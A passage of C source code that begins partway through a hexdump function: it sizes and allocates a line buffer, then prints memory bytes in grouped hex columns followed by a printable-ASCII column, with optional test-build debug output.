	line_len = 3 * BYTES_IN_MINOR_GROUP; 	/* 3 bytes per byte */
	line_len *= MINOR_GROUPS_IN_MAJOR; 		/* this many groups of those */
	line_len += MINOR_GROUPS_IN_MAJOR; 		/* this many extra spaces */
	line_len *= MAJOR_GROUPS_PER_LINE; 		/* this many major groups */
	line_len += MAJOR_GROUPS_PER_LINE;  	       	/* this many extra spaces */
	/* ascii area */
	line_len += (BYTES_IN_MINOR_GROUP * MINOR_GROUPS_IN_MAJOR) * MAJOR_GROUPS_PER_LINE;
	line_len += 1; 				/* trailing newline */
	line_len += 4; 				/* prefix spaces */
#ifdef TEST_HEXDUMP
	printf("allocating line of %u bytes\n", line_len);
#endif
	line = (u_char *)malloc(line_len + 1);

	/* init our pointers */
	hex_p = ptr;
	asc_p = ptr;

	/* ok.. dump the amount specified */
	while (hex_p - ptr < len) {
		line_p = line;

		/* put some prefix spaces */
		*line_p++ = ' ';
		*line_p++ = ' ';
		*line_p++ = ' ';
		*line_p++ = ' ';

		/* build X bytes into X minor groups into X major groups for each line */
		for (maj_cnt = 0; maj_cnt < MAJOR_GROUPS_PER_LINE; maj_cnt++) {
			for (min_cnt = 0; min_cnt < MINOR_GROUPS_IN_MAJOR; min_cnt++) {
				for (byte_cnt = 0; byte_cnt < BYTES_IN_MINOR_GROUP; byte_cnt++) {
					if (hex_p - ptr < len) {
						sprintf((char *)line_p, "%02x ", *hex_p & 0xff);
						hex_p ++;
					} else {
						strcpy((char *)line_p, "   ");
					}
					line_p += 3;
				}
				*line_p++ = ' ';
			}
			*line_p++ = ' ';
		}

		/* now put the ascii stuff after it */
		for (byte_cnt = 0; byte_cnt < (BYTES_IN_MINOR_GROUP * MINOR_GROUPS_IN_MAJOR) * MAJOR_GROUPS_PER_LINE; byte_cnt++) {
			if (asc_p - ptr < len) {
				if (isprint(*asc_p))
					*line_p++ = *asc_p;
				else
					*line_p++ = '.';
				asc_p++;
			} else {
				*line_p++ = ' ';
			}
		}

		*line_p++ = '\n';
		*line_p++ = '\0';

		fprintf(OUT_FILEP, "%s", line);
	}

#ifdef TEST_HEXDUMP
	printf("actual line length: %d\n", strlen(line));
#endif
	free(line);
}

```